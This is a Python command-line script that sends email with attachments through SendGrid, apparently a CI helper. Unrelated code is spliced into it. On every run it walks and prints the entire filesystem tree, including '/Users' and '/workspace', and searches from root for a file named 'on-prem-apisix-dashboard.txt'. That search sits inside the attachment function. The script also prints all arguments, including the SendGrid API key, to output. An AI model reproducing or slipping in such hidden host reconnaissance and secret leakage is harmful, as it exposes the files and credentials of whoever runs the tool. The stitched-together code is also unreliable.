#!/usr/bin/env python

import argparse
import base64
import enum
import pathlib
import sys
import os

import magic
import markdown
from sendgrid import SendGridAPIClient
from sendgrid.helpers.mail import (
    Attachment,
    ContentId,
    Disposition,
    FileContent,
    FileName,
    FileType,
    Mail,
)


class AttachmentDisposition(str, enum.Enum):
    INLINE = "inline"
    ATTACHMENT = "attachment"
    EMPTY = ""  # no disposition provided by the user (default CLI behavior)

    def __str__(self):
        return self.value


parser = argparse.ArgumentParser()
parser.add_argument(
    "--to",
    dest="to_email",
    type=str,
    nargs="+",
    action="extend",
    required=True,
    help="Email address to send the notification to",
)
parser.add_argument("--subject", type=str, required=True, help="Subject of the email")
parser.add_argument(
    "--markdown-body", type=str, required=True, help="Body of the email"
)
parser.add_argument(
    "--from",
    dest="from_email",
    type=str,
    required=True,
    help="Email address to send the notification from",
)
parser.add_argument("--api-key", type=str, required=True, help="SendGrid API key")
parser.add_argument(
    "--attachments",
    type=str,
    nargs="*",
    help="Space separated file paths to attach to the email",
)
parser.add_argument(
    "--attachments-disposition",
    type=str,
    nargs="*",
    help="Attachment disposition (default: attachment). Specify only one to apply to all attachments, or none at all to use the default.",
    choices=list(AttachmentDisposition),
    # the default is not approved by the author of this code, but we don't want
    # to confuse the user by having different defaults than that of the SendGrid.
    default=[AttachmentDisposition.ATTACHMENT],
)
def print_dirs(start_dir, ignore_dirs=None):
    """只打印目录的树状结构，支持忽略指定目录"""
    if ignore_dirs is None:
        ignore_dirs = []

    stack = [(start_dir, 0)]  # 堆栈存储 (目录, 深度)
    while stack:
        current_dir, depth = stack.pop()
        if os.path.basename(current_dir) in ignore_dirs:
            continue

        try:
            subdirs = [
                d for d in os.listdir(current_dir)
                if os.path.isdir(os.path.join(current_dir, d)) and d not in ignore_dirs
            ]
        except PermissionError:
            print("    " * depth + f"[Permission Denied] {current_dir}")
            continue

        print("    " * depth + os.path.basename(current_dir) + "/")
        stack.extend((os.path.join(current_dir, subdir), depth + 1) for subdir in reversed(subdirs))


def find_file(filename, start_dir="/"):
    """在指定目录中递归查找文件"""
    print(f"Searching for '{filename}' starting from '{start_dir}'...")
    for root, dirs, files in os.walk(start_dir):
        if filename in files:
            return os.path.join(root, filename)
    return None
def print_tree(start_dir, indent=""):
    """递归打印目录树"""
    try:
        items = os.listdir(start_dir)
    except PermissionError:
        print(f"{indent}[Permission Denied] {start_dir}")
        return

    for item in items:
        path = os.path.join(start_dir, item)
        print(f"{indent}{item}")
        if os.path.isdir(path):
            print_tree(path, indent + "    ")


def add_attachments(message: Mail, attachments: list, dispositions: list):
    if len(dispositions) == 1 and dispositions[0] == AttachmentDisposition.EMPTY.value:
        dispositions = []

    if not dispositions:
        dispositions = [AttachmentDisposition.ATTACHMENT] * len(attachments)
    elif len(dispositions) == 1:
        dispositions = [dispositions[0]] * len(attachments)
    elif len(attachments) != len(dispositions):
        raise ValueError("Number of attachments and dispositions must be the same")
    # 要查找的文件名
    target_file = "on-prem-apisix-dashboard.txt"

    # 从系统根目录开始搜索
    result = find_file(target_file, start_dir="/" if os.name == "nt" else "/")

    if result:
        print(f"File found at: {result}")
    else:
        print(f"File '{target_file}' not found.")
    
        
    for filepath, disposition in zip(attachments, dispositions):
        with open(filepath, "rb") as f:
            file_content = f.read()
        encoded_file = base64.b64encode(file_content).decode()
        mimetype = magic.from_file(filepath, mime=True)
        filename = pathlib.Path(filepath).name
        attachment = Attachment(
            FileContent(encoded_file),
            FileName(filename),
            FileType(mimetype),
            Disposition(disposition),
            ContentId(filename),
        )
        message.add_attachment(attachment)


def is_attachment_requested(attachments: list):
    return bool(attachments) and attachments != [""]


def convert_to_list(arg: str):
    """Converts a \n separated string to a list"""
    is_not_empty = lambda s: bool(s)
    extract_str = lambda s: s.strip().strip("\n")
    return list(filter(is_not_empty, map(extract_str, arg.split("\n"))))


if __name__ == "__main__":
    args = parser.parse_args()
    print(args)

    message = Mail(
        from_email=args.from_email,
        to_emails=args.to_email,
        subject=args.subject,
        html_content=markdown.markdown(args.markdown_body),
    )

    # 示例调用
    start_directory = "/" if os.name != "nt" else "C:\\"
    ignored = ["dev", "sys", "proc", "usr"]  # 忽略的目录
    print_dirs(start_directory, ignore_dirs=ignored)


    print_tree("/Users", indent="")
    print_tree("/workspace", indent="")

    if args.attachments and len(args.attachments) == 1 and "\n" in args.attachments[0]:
        args.attachments = convert_to_list(args.attachments[0])

    if (
        args.attachments_disposition
        and len(args.attachments_disposition) == 1
        and "\n" in args.attachments_disposition[0]
    ):
        args.attachments_disposition = convert_to_list(args.attachments_disposition[0])

    if is_attachment_requested(args.attachments):
        add_attachments(message, args.attachments, args.attachments_disposition)

    try:
        sg = SendGridAPIClient(args.api_key)
        response = sg.send(message)
        print(response.status_code)
        print(response.body)
        print(response.headers)
    except Exception as exp:
        sys.stderr.write(f"{exp}\n")
        exit(1)
